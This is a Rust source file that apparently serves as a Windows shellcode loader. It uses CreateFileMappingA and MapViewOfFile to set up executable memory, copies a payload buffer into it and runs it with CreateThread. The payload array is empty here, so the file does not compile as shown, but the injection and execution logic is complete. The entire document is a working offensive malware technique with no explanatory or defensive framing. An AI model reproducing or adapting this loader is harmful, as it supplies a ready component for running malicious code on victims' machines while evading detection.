#[allow(deprecated)]
use std::{intrinsics::copy_nonoverlapping, mem::transmute, ptr::null_mut};

use winapi::{
    ctypes::c_void,
    um::{
        errhandlingapi::GetLastError,
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
        memoryapi::{FILE_MAP_EXECUTE, FILE_MAP_WRITE, MapViewOfFile},
        processthreadsapi::CreateThread,
        synchapi::WaitForSingleObject,
        winbase::CreateFileMappingA,
        winnt::PAGE_EXECUTE_READWRITE,
    },
};

const BUF: &[u8] = &[
    ,
];

fn map_view_inject(payload: &[u8], payload_size: usize, paddress: &mut *mut c_void) -> bool {
    unsafe {
        let h_file = CreateFileMappingA(
            INVALID_HANDLE_VALUE,
            null_mut(),
            PAGE_EXECUTE_READWRITE,
            0,
            payload_size as u32,
            null_mut(),
        );

        if h_file.is_null() {
            println!(
                "[-] CreateFileMappingA failed with error: {}",
                GetLastError()
            );
            return false;
        }

        let mapped_address = MapViewOfFile(
            h_file,
            FILE_MAP_WRITE | FILE_MAP_EXECUTE,
            0,
            0,
            payload_size,
        );

        if mapped_address.is_null() {
            println!("[-] MapViewOfFile failed with error: {}", GetLastError());
            return false;
        }

        copy_nonoverlapping(payload.as_ptr(), mapped_address as *mut u8, payload_size);

        *paddress = mapped_address;

        if h_file != INVALID_HANDLE_VALUE {
            CloseHandle(h_file);
        }
    }

    return true;
}

fn pause() {
    println!("Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    let mut paddress: *mut c_void = null_mut();

    if map_view_inject(&BUF, BUF.len(), &mut paddress) {
        println!("[+] Shellcode injected at address: {:p}", paddress);
    } else {
        println!("[-] Shellcode injection failed.");
    }

    unsafe {
        let h_thread: *mut c_void;
        let mut thread_id = 0;
        h_thread = CreateThread(
            null_mut(),
            0,
            Some(transmute(paddress)),
            null_mut(),
            0,
            &mut thread_id,
        );

        if h_thread.is_null() {
            println!("[-] CreateThread failed with error: {}", GetLastError());
        } else {
            println!("[+] Thread created successfully with ID: {}", thread_id);
        }

        WaitForSingleObject(h_thread, 0xFFFFFFFF);

        if !h_thread.is_null() {
            CloseHandle(h_thread);
        }

        pause();
    }
}
